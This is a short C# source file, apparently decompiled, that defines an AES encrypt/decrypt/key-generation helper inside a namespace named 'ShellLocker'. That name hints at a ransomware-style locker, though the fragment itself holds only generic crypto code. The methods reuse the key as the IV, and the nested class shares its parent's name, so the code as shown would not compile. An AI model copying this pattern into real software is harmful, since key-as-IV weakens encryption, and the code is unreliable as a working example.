using System.Diagnostics;
using System.Security.Cryptography;

namespace ShellLocker;

public class AES
{
	public class AES
	{
		[DebuggerNonUserCode]
		public AES()
		{
		}

		public static byte[] decrypt(byte[] byte_ciphertext, byte[] key)
		{
			ICryptoTransform cryptoTransform = new RijndaelManaged
			{
				KeySize = 128
			}.CreateDecryptor(key, key);
			return cryptoTransform.TransformFinalBlock(byte_ciphertext, 0, byte_ciphertext.Length);
		}

		public static byte[] encrypt(byte[] data, byte[] key)
		{
			ICryptoTransform cryptoTransform = new RijndaelManaged
			{
				KeySize = 128
			}.CreateEncryptor(key, key);
			return cryptoTransform.TransformFinalBlock(data, 0, data.Length);
		}

		public static byte[] generateKey()
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 128;
			rijndaelManaged.GenerateKey();
			return rijndaelManaged.Key;
		}
	}
}
